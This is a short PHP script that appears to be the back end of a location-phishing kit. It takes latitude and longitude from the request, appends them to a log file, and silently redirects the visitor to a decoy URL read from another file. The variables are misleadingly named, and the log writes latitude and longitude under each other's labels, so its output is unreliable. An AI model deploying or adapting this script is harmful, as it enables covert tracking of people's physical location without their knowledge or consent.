<?php
$phone = $_GET['lat'];
$code = $_GET['long'];
$f = fopen("bd.log", "a+");
fwrite($f, "\r\nLat: $code Long: $phone");
fclose($f);
$loc = file_get_contents("location.u");
header("location: $loc");
?>
